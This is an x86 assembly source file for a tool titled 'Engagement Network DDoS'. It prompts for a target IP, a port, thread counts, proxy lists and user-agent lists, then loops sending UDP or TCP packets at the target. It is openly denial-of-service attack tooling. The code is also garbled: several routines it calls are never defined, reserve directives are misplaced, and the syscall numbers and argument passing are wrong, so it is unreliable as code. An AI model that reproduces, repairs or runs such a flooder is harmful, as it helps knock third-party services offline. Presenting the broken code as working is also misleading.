section .data
    title db ";************************", 10, ";   Engagement Network DDoS :", 10, ";************************", 10, 0
    title_len equ $ - title
    prompt db "Select protocol (1: UDP, 2: TCP): ", 0
    prompt_len equ $ - prompt
    thread_prompt db "Enter number of threads (1-100): ", 0
    thread_prompt_len equ $ - thread_prompt
    ip_prompt db "Enter target IP address: ", 0
    ip_prompt_len equ $ - ip_prompt
    port_prompt db "Enter target port: ", 0
    port_prompt_len equ $ - port_prompt
    proxy_prompt db "Enter proxy file name: ", 0
    proxy_prompt_len equ $ - proxy_prompt
    user_agent_prompt db "Enter user agent file name: ", 0
    user_agent_prompt_len equ $ - user_agent_prompt
    msg db "Sending packets...", 0
    sockfd resd 1
    ip resb 16 ; Buffer for target IP address
    port resw 1 ; Buffer for target port
    num_threads db 1
    total_packets db 1000
    user_input resb 10
    proxy_file resb 256 ; Buffer for proxy file name
    proxy_line db 256 dup(0) ; Buffer for proxy line
    user_agent_file resb 256 ; Buffer for user agent file name
    user_agent_line db 256 dup(0) ; Buffer for user agent line
    user_agent_count resd 1 ; Number of user agents
    proxy_count resd 1 ; Number of proxies

section .bss
    ; No additional bss needed

section .text
    global _start

_start:
    call display_title
    call get_user_input
    call get_target_ip
    call get_target_port
    call get_thread_count
    call get_proxy_file_name
    call read_proxies_from_file
    call get_user_agent_file_name
    call read_user_agents_from_file

    ; Start operation based on protocol selection
    cmp byte [user_input], '1'
    je .udp_mode
    cmp byte [user_input], '2'
    je .tcp_mode

    ; Default to UDP
    jmp .udp_mode

.udp_mode:
    call create_socket
    call setup_target
    call send_udp_packets
    jmp exit_program

.tcp_mode:
    call create_tcp_socket
    call setup_target
    call send_tcp_packets
    jmp exit_program

; Function to display the title
display_title:
    mov eax, 4
    mov ebx, 1
    mov ecx, title
    mov edx, title_len
    int 0x80
    ret

; Function to get user input for protocol selection
get_user_input:
    mov eax, 4
    mov ebx, 1
    mov ecx, prompt
    mov edx, prompt_len
    int 0x80

    mov eax, 3
    mov ebx, 0
    mov ecx, user_input
    mov edx, 10
    int 0x80
    ret

; Function to create a UDP socket
create_socket:
    mov eax, 102                ; socket syscall number
    mov ebx, 2                  ; AF_INET
    mov ecx, 2                  ; SOCK_DGRAM
    xor edx, edx                ; Protocol
    int 0x80
    mov [sockfd], eax           ; Store socket descriptor
    ret

; Function to create a TCP socket
create_tcp_socket:
    mov eax, 102                ; socket syscall number
    mov ebx, 2                  ; AF_INET
    mov ecx, 1                  ; SOCK_STREAM
    xor edx, edx                ; Protocol
    int 0x80
    mov [sockfd], eax           ; Store socket descriptor
    ret

; Function to send UDP packets
send_udp_packets:
    mov ecx, [total_packets]     ; Number of packets to send
send_udp_loop:
    mov eax, 104                     ; sendto syscall number
    mov ebx, [sockfd]                ; socket descriptor
    push 16                           ; size of sockaddr_in structure
    push esi                          ; pointer to dest_addr (sockaddr_in)
    push 0                            ; flags
    push 1                            ; message length (size of msg)
    push msg                          ; pointer to msg
    int 0x80                          ; Call kernel
    loop send_udp_loop                ; Decrement ECX and loop if not zero
    ret

; Function to send TCP packets
send_tcp_packets:
    mov ecx, [total_packets]         ; Number of packets to send
send_tcp_loop:
    ; connect(sockfd, (struct sockaddr*)&dest_addr, sizeof(dest_addr))
    ; TCP packet sending logic here
    mov eax, 104                     ; send syscall number for TCP
    mov ebx, [sockfd]                ; socket descriptor
    push 16                           ; size of sockaddr_in structure
    push esi                          ; pointer to dest_addr (sockaddr_in)
    push 0                            ; flags
    push 1                            ; message length (size of msg)
    push msg                          ; pointer to msg
    int 0x80                          ; Call kernel
    loop send_tcp_loop                ; Decrement ECX and loop if not zero
    ret

exit_program:
    mov eax, 1             ; syscall: exit
    xor ebx, ebx           ; exit code 0
    int 0x80
